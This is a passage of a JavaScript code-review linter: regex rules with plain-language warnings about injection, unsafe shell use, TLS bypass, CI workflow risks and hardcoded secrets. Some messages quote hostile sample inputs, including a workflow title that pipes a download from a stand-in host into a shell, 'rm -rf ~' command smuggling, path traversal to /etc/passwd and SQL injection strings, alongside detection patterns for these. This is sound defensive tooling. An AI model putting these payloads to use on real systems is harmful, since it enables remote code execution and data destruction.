    'a goroutine changes a variable that other goroutines can also touch, with no lock: a data race, so counts come out wrong at random. Use sync.Mutex, sync/atomic (atomic.AddInt64), or send the change on a channel; go run -race finds these.'],
  ['rails-where-interp', 'risk', ['ruby'], (m, r) => /\.(?:where|find_by_sql|order|having|joins|select|group|pluck|exists\?)\s*\(\s*"[^"]*#\{/.test(r),
    'a value is pasted into the SQL text with #{}: a value like \' OR 1=1 -- changes the query (SQL injection). Pass it separately: where("name = ?", params[:name]), or where(name: params[:name]).'],
  ['requests-no-timeout', 'risk', ['python'], (m, r, x) => /\brequests\.(?:get|post|put|patch|delete|head|request)\s*\(/.test(m) && (!/\btimeout\s*=/.test(x.statement()) || /\btimeout\s*=\s*None\b/.test(x.statement())),
    'requests waits forever by default: if the server never answers, this line hangs the program. Give it a timeout in seconds: requests.get(url, timeout=10).'],
  ['py2-print', 'bug', ['python'], (m, r) => /^\s*print\s+(?:['"]|[A-Za-z_]\w*\s*$)/.test(r),
    'print without parentheses is Python 2: in Python 3 it is a syntax error. Write print("hello").'],
  ['wildcard-import', 'style', ['python'], (m) => /^\s*from\s+[\w.]+\s+import\s+\*/.test(m),
    'import * pulls every name from the module into yours, so it is unclear where a name comes from and one can silently replace another (os.open hides the built-in open). Import the names you use: from os import path, getcwd.'],
  ['null-deref', 'bug', ['java', 'csharp', ...JS], (m) => { const k = m.match(/\b(\w+)\s*=\s*null\s*;(?![^;]*\b\1\s*=)([^;]*;?[^;]*?)\b\1\s*\.\s*\w+/); if (!k) return false;
      // a null check between the two (if (s != null), if (s), s && …, !s || …, s == null || …, s ? … : …) makes the call safe
      const v = k[1].replace(/\$/g, '\\$'); return !new RegExp('\\b' + v + '\\s*!==?\\s*null|\\bnull\\s*!==?\\s*' + v + '\\b|\\bif\\s*\\(\\s*' + v + '\\s*\\)|\\b' + v + '\\s*&&|!\\s*' + v + '\\s*\\|\\||\\b' + v + '\\s*===?\\s*null\\s*\\|\\||\\b' + v + '\\s*\\?(?!\\.)').test(k[2]); },
    'the variable is set to null and then used with a dot, so this line throws (a NullPointerException in Java, a TypeError in JavaScript). Give it a value first, or check: if (s != null).'],
  ['php-include-input', 'risk', ['php'], (m, r) => /\b(?:include|require)(?:_once)?\b\s*\(?[^;]*\$_(?:GET|POST|REQUEST|COOKIE)\b/.test(r),
    'the file to include comes from the request, so a visitor chooses which file runs: ../../etc/passwd to read files, or a URL to run their own code. Map allowed names to files: $pages = ["home" => "home.php"]; include $pages[$_GET["page"]] ?? "home.php";'],
  ['cd-empty-rm', 'risk', ['shell'], (m, r) => { const k = r.match(/\bcd\s+"?\$\{?(\w+)\}?"?\s*(?:&&|;|\n)\s*rm\s+-[a-zA-Z]*r[a-zA-Z]*\s+\*/); return !!k && !new RegExp('\\$\\{' + k[1] + ':\\?').test(r); }, // only a guard on the cd variable itself counts
    'if the variable is empty, cd $dir goes to your home folder and cd "$dir" stays where you are (and with ; even a failed cd carries on), so rm -rf * then deletes everything in that folder. Stop on an empty value and delete by path: rm -rf -- "${dir:?}"/*'],
  ['order-by-rand', 'style', ['sql'], (m) => /\bORDER\s+BY\s+(?:RAND|RANDOM|NEWID)\s*\(\s*\)/i.test(m),
    'ORDER BY RAND() gives every row a random number and sorts the whole table each time, so it gets slow as the table grows. For one random row, pick a random id or offset first (OFFSET floor(random() * count)), or sample with TABLESAMPLE.'],
  ['rust-unsafe', 'risk', ['rust'], (m, r) => /\bunsafe\s*\{/.test(m) && !/\/\/\s*SAFETY:/.test(r),
    'an unsafe block turns off Rust\'s checks: a wrong raw pointer here is undefined behaviour (crashes or silent memory corruption). Keep it as small as possible and write a // SAFETY: comment saying why it holds; prefer a safe API (references, Box, slices) if there is one.'],
  ['verify-false', 'risk', ['python', ...JS], (m) => /\bverify\s*=\s*False\b|rejectUnauthorized\s*:\s*false\b|NODE_TLS_REJECT_UNAUTHORIZED/.test(m),
    'certificate checks are turned off, so anyone on the network can read or change this traffic. Fix the certificate (or point to the right CA bundle) instead.'],
  ['curl-insecure', 'risk', ['shell', 'dockerfile'], (m, r) => /\b(?:curl\b[^|;\n]*\s(?:-[a-zA-Z]*k[a-zA-Z]*|--insecure)(?=\s|$)|wget\b[^|;\n]*\s--no-check-certificate\b)/.test(r),
    '-k (--insecure) turns off the certificate check, so anyone between you and the server can read or change what comes back. Fix the certificate instead, or point curl at it with --cacert'],
  ['docker-latest', 'risk', ['dockerfile'], (m, r, x) => { const k = r.match(/^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)/i); return !!k && !/@sha256:/.test(k[1]) && k[1] !== 'scratch' && !/^\$/.test(k[1]) && (/:latest$/i.test(k[1]) || !/:[^/]+$/.test(k[1])) && !new RegExp('\\bAS\\s+' + k[1].replace(/[^\w.-]/g, '') + '\\s*$', 'im').test(x.prev()); }, // FROM build names an earlier stage, not an image
    'no fixed version: :latest (or no tag) means each build can pull a different image, so a build that worked yesterday can break today. Pin a version tag, such as node:20-slim, or a digest'],
  ['perl-shell-interp', 'risk', ['perl'], (m, r) => /\b(?:system|exec)\s*\(?\s*"[^"]*[$@]\w|`[^`]*\$\w|\bqx\s*[({\/][^)}\/]*\$\w/.test(r),
    'a variable inside one shell string: a file name such as "x; rm -rf ~" runs as a command. Pass the program and its arguments separately: system("rm", "--", $file)'],
  ['lua-global', 'style', ['lua'], (m, r, x) => { const k = m.match(/^\s*([A-Za-z_]\w*)\s*=[^=]/); return !!k && !/^(?:_G|_ENV)$/.test(k[1]) && !new RegExp('\\blocal\\s+(?:function\\s+|[\\w\\s,]*,\\s*)?' + k[1] + '\\b|\\bfunction\\b[^\\n]*\\([^)]*\\b' + k[1] + '\\b|\\bfor\\s+(?:[\\w\\s,]*,\\s*)?' + k[1] + '\\b').test(x.prev()); },
    'without local this makes a global: any other file that uses the same name changes it too. Write local x = ... the first time'],
  ['shell-eval', 'risk', ['shell'], (m, r) => /(?:^|[;&|(]\s*|\s)eval\s/.test(m) && /\beval\s+[^#\n]*\$/.test(r),
    'eval runs its text as a command again, so a value such as "x; rm -rf ~" in that variable runs too. Call the command directly with its arguments, or use an array: "${args[@]}"'],
  ['ps-invoke-expression', 'risk', ['powershell'], (m, r) => /\b(?:Invoke-Expression|iex)\b[^#\n]*\$/i.test(r),
    'Invoke-Expression runs a string as code, so whatever that variable holds (text a user typed, a downloaded script) runs with your rights. Call the command directly with & and its arguments, or parse the value first'],
  // only inbound rules: an egress block, type = "egress" or direction = "EGRESS" opens the way out, not in
  ['tf-open-ingress', 'risk', ['terraform'], (m, r, x) => !/\b(?:type\s*=\s*"egress"|direction\s*=\s*"EGRESS")/i.test(x.object()) && ((x.prev() + '\n' + m).match(/\b(?:ingress|egress)\b/g) || ['ingress']).pop() !== 'egress' && /\b(?:cidr_blocks|ipv6_cidr_blocks|source_ranges|source_address_prefix(?:es)?)\s*=\s*\[?[^\]\n]*"(?:0\.0\.0\.0\/0|::\/0|\*)"/.test(r),
    '0.0.0.0/0 opens this to the whole internet. Fine for a public web port (80, 443); for SSH, databases or admin ports, allow only the addresses that need it'],
  ['grant-all', 'risk', ['sql'], (m) => /\bGRANT\s+ALL\b/i.test(m),
    'GRANT ALL gives this account every right (dropping tables, changing users), so one leaked password or injection can do anything. Grant only what the app needs, such as SELECT, INSERT, UPDATE on its own tables, and avoid \'%\' (any host) where you can'],
  ['blank-no-opener', 'style', ['html', ...JS], (m, r) => /\btarget\s*=\s*["']?_blank\b/i.test(r) && !/[\s"'{]rel\s*=\s*["'{][^"'}]*\bno(?:opener|referrer)\b/i.test(r), // a real rel attribute, not data-rel
    'target="_blank" without rel="noopener": in older browsers the new tab can reach back through window.opener and send this page somewhere else. Add rel="noopener noreferrer" (new browsers already act this way)'],
  ['img-no-alt', 'style', ['html', ...JS], (m, r) => /<img\b(?![^>]*[\s"']alt\s*=)[^>]*>/i.test(r), // a real alt attribute, not data-alt
    'an image with no alt text: screen readers say the file name or nothing at all. Add alt="what it shows", or alt="" if it is only decoration'],
  ['image-latest', 'risk', ['yaml'], (m, r) => { const k = r.match(/^\s*(?:-\s+)?image:\s*["']?([^\s"'#]+)/); return !!k && !/@sha256:|^\$|\{\{/.test(k[1]) && (/:latest$/i.test(k[1]) || !/:[^/]+$/.test(k[1])); },
    'no fixed version: :latest (or no tag) means each deploy can pull a different image, so what worked yesterday can break today. Pin a version tag, such as postgres:16, or a digest'],
  ['js-exec-concat', 'risk', JS, (m, r) => /\b(?:child_process\.)?exec(?:Sync)?\s*\(\s*(?:`[^`]*\$\{|(['"])[^'"]*\1\s*\+|[A-Za-z_$][\w$.]*\s*\+)/.test(r),
    'a shell command built from a variable: a value like "x; rm -rf ~" runs as a second command. Use execFile / spawn with the arguments as an array, so nothing is read by a shell'],
  ['reflected-input', 'risk', JS, (m) => /\bres\.(?:send|write|end)\s*\(\s*req\.(?:query|params|body)\b/.test(m),
    'the request is sent straight back as the page: a link with <script> in it runs in the visitor\'s browser (reflected XSS). Escape it, or send it as JSON with res.json'],
  ['token-in-storage', 'risk', JS, (m, r) => /\b(?:localStorage|sessionStorage)\.setItem\s*\(\s*(['"`])[^'"`]*(?:token|jwt|session|auth|secret|password)[^'"`]*\1/i.test(r),
    'a login token in localStorage can be read by any script on the page, so one XSS bug hands it over. Keep it in an HttpOnly, Secure cookie the page\'s scripts cannot read'],
  ['java-runtime-exec', 'risk', ['java', 'kotlin'], (m) => /\bRuntime\.getRuntime\(\)\.exec\s*\(\s*(?!")[^)]/.test(m),
    'Runtime.exec with a variable command: when any of it comes from a user, they choose what runs. Use ProcessBuilder with a fixed program and the arguments as separate strings'],
  // GitHub Actions workflows (GitHub's "Security hardening for GitHub Actions"): untrusted event text in a script, movable action
  // versions, PR code run with secrets, a token that can write everything, a secret printed by the script
  ['gha-script-injection', 'risk', ['yaml'], (m, r) => GHA_UNTRUSTED.test(r) && !/^\s*(?:-\s+)?if:/.test(r) && !/^\s*(?:-\s+)?(?!run:|script:)[\w-]+:\s*(["']?)\$\{\{[^}]*\}\}\1\s*(?:#.*)?$/.test(r),
    'text anyone can write (an issue or pull request title, a comment, a branch name) is pasted into the script, so a title like a"; curl evil.sh | sh; " runs on the runner with your token. Pass it through env: (TITLE: ${{ github.event.issue.title }}) and use "$TITLE" in the script'],
  ['gha-unpinned-action', 'risk', ['yaml'], (m, r) => { const k = r.match(/^\s*(?:-\s+)?uses:\s*["']?([\w.-]+)\/[\w./-]+@([\w./-]+)/); if (!k || /^[0-9a-f]{40}$/.test(k[2])) return false;
      return /^(?:main|master|dev|develop|head|latest)$/i.test(k[2]) || !/^(?:actions|github)$/i.test(k[1]); },
    'this action is pinned to a tag or a branch, and whoever controls that repository can move it to new code that then runs with your secrets. Pin third-party actions to a full commit SHA (uses: owner/action@<40-character sha> # v1.2.3)'],
  ['gha-prt-checkout', 'risk', ['yaml'], (m, r, x) => /^\s*(?:-\s+)?ref:\s*["']?\$\{\{\s*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref)\b/.test(r) && /^\s*(?:-\s+)?pull_request_target\b/m.test(x.prev()),
    'a pull_request_target workflow runs with your secrets and a write token, and this step checks out the pull request\'s own code, so anyone who opens a PR can run their code with them. Build PR code under the pull_request event instead'],
  ['gha-write-all', 'risk', ['yaml'], (m, r) => /^\s*permissions:\s*["']?write-all\b/.test(r),
    'write-all gives every step a token that can push code, change releases and edit issues. Grant only what the job needs: permissions: contents: read, plus the one write it uses'],
  ['gha-secret-echo', 'risk', ['yaml'], (m, r) => /(?:^|[\s;|&(])(?:echo|printf)\b[^#\n]*\$\{\{\s*secrets\.\w+/.test(r),
    'the script prints a secret. GitHub masks secrets it knows in the log, but a changed or partial value slips through. Pass it through env: and never print it'],
  ['yaml-privileged', 'risk', ['yaml'], (m) => /^\s*(?:-\s+)?privileged:\s*true\b/.test(m),
    'privileged: true gives the container root on the host machine: a bug in it becomes a way out of the container. Grant only the capabilities it needs (securityContext.capabilities.add)'],
  ['cs-async-void', 'bug', ['csharp'], (m) => /\basync\s+void\s+\w+\s*\((?![^)]*EventArgs)/.test(m),
    'async void can\'t be awaited, and an exception in it crashes the process instead of reaching the caller. Return Task: async Task Save() (async void is only for event handlers)'],
  ['cs-sync-over-async', 'risk', ['csharp'], (m) => /\w+Async\([^()]*(?:\([^()]*\)[^()]*)*\)\s*\.\s*(?:Result\b|Wait\(\s*\)|GetAwaiter\(\s*\)\s*\.\s*GetResult\(\s*\))/.test(m),
    'blocking on an async call (.Result / .Wait()) can deadlock in UI and ASP.NET code and ties up a thread while it waits. await it instead: var r = await client.GetAsync(url)'],
  ['cs-null-or-empty', 'style', ['csharp'], (m) => /\b(\w+)\s*==\s*null\s*\|\|\s*\1\s*==\s*(?:""|string\.Empty)/.test(m),
    'string.IsNullOrEmpty(s) says the same thing in one call (or IsNullOrWhiteSpace to treat "  " as empty too)'],
  ['kt-globalscope', 'risk', ['kotlin'], (m) => /\bGlobalScope\.(?:launch|async)\b/.test(m),
    'a GlobalScope coroutine is never cancelled with the screen or request that started it, so it leaks and can touch dead UI. Launch it in a lifecycle scope: viewModelScope.launch { ... }'],
  ['swift-main-sync', 'bug', ['swift'], (m) => /\bDispatchQueue\.main\.sync\b/.test(m),
    'DispatchQueue.main.sync called from the main thread waits for itself forever (a deadlock). Use DispatchQueue.main.async'],
  ['php-unserialize-input', 'risk', ['php'], (m) => /\bunserialize\s*\([^;]*\$_(?:GET|POST|COOKIE|REQUEST)\b/.test(m),
    'unserialize on visitor data can build any object your code knows, which attackers chain into running code (PHP object injection). Use json_decode for data from outside'],
  ['php-loose-eq', 'style', ['php'], (m) => /\$\w+\s*(?<![=!<>])==(?!=)\s*\$?\w|\w\s*(?<![=!<>])==(?!=)\s*\$\w+/.test(m),
    '== converts types before comparing ("abc" == 0 was true before PHP 8, "1e3" == "1000" still is). Use === to compare value and type'],
  ['php-extract-input', 'risk', ['php'], (m) => /\bextract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\b/.test(m),
    'extract($_POST) turns every form field into a variable, so a visitor can overwrite $isAdmin or any other. Read the fields you expect by name'],
  ['ruby-yaml-load', 'risk', ['ruby'], (m) => /\b(?:YAML|Psych)\.load\s*\(/.test(m),
    'YAML.load can build arbitrary Ruby objects from the text (on older Psych), which turns untrusted YAML into code execution. Use YAML.safe_load'],
  ['tf-public-acl', 'risk', ['terraform'], (m, r) => /\bacl\s*=\s*"public-read(?:-write)?"/.test(r),
    'a public-read bucket lets anyone on the internet list and download every object in it. Keep it private and share through signed URLs or a CDN with access control'],
  ['docker-add-url', 'style', ['dockerfile'], (m) => /^\s*ADD\s+(?:--\S+\s+)*https?:\/\//i.test(m),
    'ADD with a URL downloads without checking what arrived. Use RUN curl with a checksum check (or ADD --checksum=sha256:...), and COPY for local files'],
  ['yaml-run-as-root', 'risk', ['yaml'], (m) => /^\s*(?:-\s+)?runAsUser:\s*0\b/.test(m),
    'runAsUser: 0 runs the container as root, so a bug in it can do anything root can. Pick a non-zero user and set runAsNonRoot: true'],
  ['yaml-host-namespace', 'risk', ['yaml'], (m) => /^\s*(?:-\s+)?host(?:Network|PID|IPC):\s*true\b/.test(m),
    'sharing the host\'s network (or process list) lets the container see and reach everything on the node. Leave hostNetwork / hostPID / hostIPC off unless it is a system agent that needs them'],
  ['effect-no-deps', 'risk', JS, (m) => /\buseEffect\(\s*(?:async\s*)?\(\s*\)\s*=>\s*(?:\{[^{}]*\}|[^,()]+\([^()]*\))\s*\)/.test(m),
    'useEffect with no dependency list runs after every render; if it sets state (a fetch that stores its result), it loops. Pass the values it depends on, or [] to run once: useEffect(() => { ... }, [])'],
  ['stale-setstate', 'bug', JS, (m) => { const k = m.match(/\b(set[A-Z]\w*)\(\s*(\w+)\s*[-+*]\s*[\w.]+\s*\)/); return !!k && new RegExp('\\b' + k[1] + '\\(\\s*' + k[2] + '\\s*[-+*]', 'g').test(m.slice(m.indexOf(k[0]) + k[0].length)); },
    'both calls read the same old value, so two "+ 1"s add only 1. Use the updater form, which gets the latest value: setCount((c) => c + 1)'],
  ['dangerous-html', 'risk', JS, (m) => /dangerouslySetInnerHTML\s*=\s*\{\{\s*__html\s*:\s*(?![\s'"`]|DOMPurify\b|\w*[sS]anitize)/.test(m),
    'dangerouslySetInnerHTML puts the text in as HTML, so a <script> or onerror in it runs (XSS) if it comes from a user. Render it as text, or clean it first: { __html: DOMPurify.sanitize(comment) }'],
  ['typeof-unquoted', 'bug', JS, (m) => /\btypeof\s+[\w$.[\]]+\s*[=!]==?\s*undefined\b/.test(m),
    'typeof gives a string, so comparing it with undefined (not "undefined") is never true. Write typeof x === "undefined", or x === undefined'],
  ['go-nil-map', 'bug', ['go'], (m) => /\bvar\s+(\w+)\s+map\[[^\]]+\][\w.*[\]]+\s*;[^;]*\b\1\[[^\]]+\]\s*[-+*/]?=(?!=)/.test(m),
    'the map is declared but never made, so it is nil and writing to it panics at run time. Make it first: m := make(map[string]int)'],
  ['go-defer-loop', 'risk', ['go'], (m) => /\bfor\b[^{]*\{[^{}]*\bdefer\b/.test(m),
    'defer inside a loop waits until the whole function returns, so every file (or lock) stays open until then and can run out. Close it in the loop, or move the body into its own function'],
  ['go-unchecked-decode', 'risk', ['go'], (m) => /^\s*(?:json|xml|yaml|gob)\.(?:Unmarshal|NewDecoder\([^)]*\)\.Decode)\s*\(/.test(m),
    'the decode error is thrown away, so bad input leaves v half-filled and nothing says why. Check it: if err := json.Unmarshal(body, &v); err != nil { return err }'],
  ['equals-null', 'bug', ['java', 'kotlin'], (m) => /\.equals\(\s*null\s*\)/.test(m),
    'x.equals(null) is always false, and throws NullPointerException when x itself is null. Write x == null'],
  ['remove-in-foreach', 'bug', ['java'], (m) => { const k = m.match(/\bfor\s*\(\s*[\w<>[\],.? ]+\s+\w+\s*:\s*(\w+)\s*\)/); return !!k && new RegExp('\\b' + k[1] + '\\.(?:remove|add|clear)\\(').test(m.slice(m.indexOf(k[0]))); },
    'changing a list while a for-each walks it throws ConcurrentModificationException. Use an Iterator and it.remove(), or list.removeIf(s -> ...)'],
  ['raise-no-from', 'style', ['python'], (m, r, x) => (/^\s*except\b[^:]*\bas\s+\w+\s*:\s*raise\s+\w+\(/.test(m) || (/^\s*except\b[^:]*\bas\s+\w+\s*:\s*$/.test(m) && /^\s*raise\s+\w+\([^)]*\)\s*$/.test(x.next(1)))) && !/\bfrom\b/.test(m + ' ' + x.next(1)),
    'raising a new error inside except hides the original one\'s cause in the traceback. Chain them: raise Exception("failed") from e'],
  ['unawaited-body', 'bug', JS, (m, r) => /(?:const|let|var)\s+[\w$]+\s*=\s*(?!await\b)[\w$]+\.(?:json|text|arrayBuffer|blob|formData)\(\s*\)/.test(m) && /\bawait\s+fetch\b|\bfetch\s*\(|\bresponse\b|\bres\b|\bdata\b/i.test(r),
    'a fetch response\'s .json() / .text() returns a promise, so the variable holds a Promise, not the data. Put await in front: const json = await res.json()'],
  ['callback-no-return', 'bug', JS, (m) => /\.(?:map|filter|find|findIndex|some|every|flatMap)\(\s*(?:\([^()]*\)|[\w$]+)\s*=>\s*\{(?![^{}]*\breturn\b)[^{}]*\}\s*\)/.test(m),
    'the arrow function has a { } body but no return, so every result is undefined (map gives [undefined, …], filter keeps nothing). Return the value, or drop the braces: x => x * 2'],
  ['open-redirect', 'risk', JS, (m) => /\bres\.redirect\(\s*(?:\d{3}\s*,\s*)?req\.(?:query|params|body)\b/.test(m),
    'redirecting to a URL taken from the request lets anyone send your users to their site from a link on yours (an open redirect, used in phishing). Only redirect to paths you know, or check the target is on your own site'],
  ['format-string', 'risk', ['c'], (m) => /\b(?:printf\s*\(\s*|fprintf\s*\(\s*[\w>.-]+\s*,\s*|syslog\s*\(\s*[\w|]+\s*,\s*)(?!")[A-Za-z_][\w.>-]*\s*\)/.test(m),
    'the text is used as the format: a % in it (from a user) reads or writes memory it should not (a format-string bug). Print it through a fixed format: printf("%s", text)'],
  ['ts-any', 'style', ['typescript'], (m) => /(?::\s*any\b(?!\s*[\w$])|\bas\s+any\b|<any>)/.test(m),
    'any switches type checking off for this value, so a wrong field or call is only found when it fails at run time. Give it a real type, or unknown and narrow it before use'],
  ['go-ignored-err', 'risk', ['go'], (m) => /^\s*_\s*=\s*[\w.]+\s*\(/.test(m) || /\b\w+\s*,\s*_\s*:?=\s*[\w.]+\s*\(/.test(m),
    'an error thrown away with _: when the call fails the code carries on with empty or half-filled values and nothing says why. Check it: if err != nil { return err }'],
  ['css-important', 'style', ['css'], (m) => /!\s*important\b/i.test(m),
    '!important wins over every other rule, so the next change needs another !important to beat it. Use a more specific selector, or put the rule later'],
  ['useless-cat', 'style', ['shell'], (m) => /(?:^|[;&|]\s*)cat\s+("?)\$?\{?[\w./-]+\}?\1\s*\|\s*(?:grep|awk|sed|head|tail|wc|sort|cut)\b/.test(m),
    'cat file | grep runs an extra process for nothing: grep foo "$file" reads the file itself. Quote the variable ("$file") too, so a name with spaces or an empty value does not break the command'],
  ['docker-root', 'risk', ['dockerfile'], (m) => /^\s*USER\s+(?:root|0)(?::\S+)?\s*$/i.test(m),
    'the container runs as root, so a break-in through the app gets full rights inside it (and an easier path to the host). Create a user and switch to it: RUN useradd -m app, then USER app'],
  ['rm-rf-var', 'risk', ['shell'], (m, r) => /\brm\s+-[a-z]*r[a-z]*f?[a-z]*\s+(?:"?\$\{?\w+\}?"?\/?)(?:\s|$|\/)/i.test(r) && !/\$\{\w+:\?/.test(r),
    'rm -rf with a variable: if the variable is empty or unset, this deletes from the current folder or from /. Guard it: rm -rf "${DIR:?}" (stops if DIR is empty).'],
  ['curl-pipe-sh', 'risk', ['shell', 'dockerfile'], (m, r) => /\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(r),
    'piping a download straight into a shell runs whatever the server sends, unseen. Download it, read it, then run it.'],
  ['chmod-777', 'risk', ['shell', 'python'], (m, r, x) => x.lang === 'python' ? /\bos\.chmod\s*\([^,]+,\s*(?:0o?777|511|stat\.S_IRWXO\b)/.test(m) : /\bchmod\s+(?:-{1,2}[a-zA-Z][\w-]*(?:=\S+)?\s+)*(?:0?777|a\+rwx|o\+w)\b/.test(m),
    'this lets every other user on the machine change these files (777 and a+rwx also let them read and run them), so another account or a compromised service can rewrite them. Give only what is needed: chmod 755 for folders and programs, 644 for files.'],
  ['unquoted-var', 'style', ['shell'], (m, r) => /^\s*(?:cd|cp|mv|rm|cat|ls|mkdir|touch|source|\.)\s+[^"'\n]*\$\{?\w+\}?/.test(r) && !/["']\$/.test(r),
    'an unquoted variable is split on spaces, so a path like "My Files" becomes two arguments. Quote it: "$path"'],
  ['update-no-where', 'bug', ['sql', '*'], (m, r, x) => /^\s*UPDATE\s+[\w."`[\]]+\s+SET\b/i.test(r) && !/\bWHERE\b/i.test(x.statement()),
    'UPDATE without WHERE changes every row in the table. Add the WHERE that picks the rows you mean.'],
  ['delete-no-where', 'bug', ['sql', '*'], (m, r, x) => /^\s*DELETE\s+FROM\s+[\w."`[\]]+\s*;?\s*$/i.test(r) && !/\bWHERE\b/i.test(x.statement()),
    'DELETE without WHERE removes every row in the table. Add a WHERE (or use TRUNCATE if that is really what you want).'],
  ['select-star', 'style', ['sql'], (m) => /\bSELECT\s+\*\s+FROM\b/i.test(m),
    'SELECT * returns every column, so the query breaks or slows down when columns are added. Name the columns you use.'],
  ['sql-concat', 'risk', ['*'], (m, r, x) => /(['"`]|\bf['"])\s*(?:SELECT\b[\s\S]*\bFROM|INSERT\s+INTO|UPDATE\s+\w+\s+SET|DELETE\s+FROM)\b/i.test(r)
      && (/['"]\s*\+\s*[\w$]|[\w$)\]]\s*\+\s*['"]/.test(r) || /['"]\s*\.\s*\$|\$[\w\]'"[]+\s*\.\s*['"]/.test(r) || (x.lang === 'php' && /"[^"]*\$[A-Za-z_]/.test(r)) || (x.lang === 'ruby' && /"[^"]*#\{/.test(r)) || /`[^`]*\$\{/.test(r) || /\bf['"][^'"]*\{/.test(r) || /['"]\s*%\s*[\w(]/.test(r) || /\.format\s*\(/.test(r)),
    'the SQL is built by pasting values into the text: a value like \' OR 1=1 -- changes the query (SQL injection). Use placeholders and pass the values separately: query("… WHERE id = ?", [id]).'],
  ['hardcoded-secret', 'risk', ['*'], (m, r, x) => hasSecret(r, x.lang),
    'a key, token or password is written into the code. Anyone who sees the code (or the repo history) has it. Move it to an environment variable or a secret store, and change the key if this code was ever shared.'],
  ['plain-http', 'risk', ['*'], (m, r) => /(?<!xmlns(?::[\w-]+)?=)['"`]http:\/\/(?!localhost\b|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|[\w-]+\.local\b|[\w.-]*example\.(?:com|org|net)\b|(?:www\.)?w3\.org\b|schemas\.(?:microsoft\.com|openxmlformats\.org)\/)[\w-]+\.[\w.-]+/.test(r), // XML namespace and package-type names are identifiers, never fetched
    'an http:// address sends data unencrypted, so it can be read or changed on the way. Use https:// if the server supports it.'],
  ['todo', 'note', ['*'], (m, r) => /\b(?:TODO|FIXME|HACK|XXX)\b/.test(r),
    'a TODO/FIXME is left here: something is known to be unfinished.'],
];
// a key written into the code: a known key format inside a string, a long string assigned to a key-like name, a password in a URL,
// or (in shell and .env files, where values aren't quoted) NAME=value. Reading one from the environment or a variable is fine.
const KEYNAME = /(?:api[_-]?key|apikey|secret|client[_-]?secret|password|passwd|pwd|access[_-]?token|refresh[_-]?token|auth[_-]?token|token|private[_-]?key)\w*["']?\s*:?[:=]\s*$/i;
const PASSNAME = /(?:password|passwd|pwd)\w*["']?\s*:?[:=]\s*$/i;
function hasSecret(r, lang) {
  const strs = [...r.matchAll(/(["'`])((?:\\.|(?!\1)[^\\])*)\1/g)];
  for (const s of strs) {
    const v = s[2];
    if (redact(v) !== v && !/^\[redacted/.test(v)) return true;
    const before = r.slice(0, s.index), min = PASSNAME.test(before) ? 4 : 8; // people's passwords are often short; random keys are not
    if (v.length >= min && /^[^\s${}<>]+$/.test(v) && !/^(?:https?:\/\/|\/|\.|[\w-]+\.(?:js|json|html|css|md|txt|py|sh)$)/i.test(v) && !/^(?:x{3,}|\*{3,}|your[_-]|<|changeme|placeholder|example|test|dummy|redacted|password|secret|none|null|true|false)/i.test(v) && KEYNAME.test(before)) return true;
  }
  if (lang === 'yaml' && /^\s*(?:-\s+)?[\w.-]*(?:password|passwd|secret|token|api[_-]?key|private[_-]?key)[\w.-]*\s*:\s*(?!["']?(?:\$|\{\{|<|!|xxx|\*\*\*|changeme|example|your[_-]))["']?[^\s"'#]{4,}/i.test(r)) return true;
  if (lang === 'dockerfile' && /^\s*(?:ENV|ARG)\s+[A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASS|PWD)[A-Z0-9_]*[= ](?!["']?\$)[^\s"'$]{4,}/i.test(r)) return true;
  if ((lang === 'shell' || lang === 'code') && /^\s*(?:export\s+)?[A-Z][A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASS|PWD)[A-Z0-9_]*=(?!["']?\$)[^\s"'$]{8,}/.test(r)) return true;
  return /\b[a-z][\w+.-]*:\/\/[^\s:@/'"`]+:[^\s@/'"`$]{3,}@/.test(r) && !/:\$\{|:\{\{/.test(r);
}
const ORDER = { bug: 0, risk: 1, style: 2, note: 3 };
// Files a pull-request review does not read: generated or copied files, data, and tests (their fixtures are bad code on purpose:
// planted fake keys, planted TODOs). Test names in every language this repo writes: test_*, *_test.py|js|mjs, *.test.js|mjs.
export const REVIEW_SKIP = /^(?:void-live-deploy\/(?:index|void)\.html|tools\/(?:bench|grown|fringe)(?:\.best)?\.json|.*\.(?:json|md|txt|lock|svg|png|jpg|gif|ico|woff2?)|(?:.*\/)?(?:test_[^/]*|[^/]*_test\.(?:py|m?js)|[^/]*\.test\.m?js))$/;
export const skippedInReview = (path) => REVIEW_SKIP.test(String(path || ''));
// The line numbers (1-based) inside <textarea> and <pre> blocks of an HTML page, open and close lines included: they hold
// text to show (sample code, a snippet to copy), not code the page runs, so a pull-request review leaves them out.
export function textLines(src) {
  const out = new Set(); let open = null;
  src.forEach((l, i) => {
    let rest = l, inside = open !== null;
    for (;;) {
      if (open === null) { const m = rest.match(/<(textarea|pre)\b[^>]*>/i); if (!m) break; open = m[1].toLowerCase(); inside = true; rest = rest.slice(m.index + m[0].length); }
      const c = rest.search(new RegExp('</' + open + '\\s*>', 'i')); if (c < 0) break;
      rest = rest.slice(c + open.length + 3); open = null;
    }
    if (inside || open !== null) out.add(i + 1);
  });
  return out;
}

export const KIND_WORD = { bug: 'bug', risk: 'risk', style: 'style', note: 'note' };

// The quick checks: [{ line, kind, rule, message, text }] most serious first, at most `max`. `text` is the line as written, keys masked.
export function ruleReview(code, opts = {}) {
  const raw = String(code || '').replace(/\r\n?/g, '\n').slice(0, 60000), lang = opts.lang || langOf(raw);
  const as = lang === 'code' ? 'javascript' : lang; // a snippet with no clear language gets the C-style checks (JavaScript's are the broadest)
  const rawLines = raw.split('\n'), maskedLines = mask(raw, as).split('\n'), found = [], seen = new Set();
  for (let i = 0; i < rawLines.length; i++) {
    const r = rawLines[i], m = maskedLines[i] || '';
    if (!r.trim()) continue;
    const ctx = { lang: as,
      // the masked lines above this one, so a rule can see what was declared earlier
      prev: () => maskedLines.slice(0, i).join('\n'),
      next: (k) => { let n = 0; for (let j = i + 1; j < rawLines.length; j++) if (rawLines[j].trim() && ++n === k) return maskedLines[j] || ''; return ''; },
      statement: () => { let st = ''; for (let j = i; j < rawLines.length && j < i + 12; j++) { st += ' ' + (maskedLines[j] || ''); if (/;\s*$/.test(maskedLines[j] || '')) break; } return st; },
      // the raw text of the { … } object this line sits in (up to 12 lines either way), so a rule can see sibling options on other lines
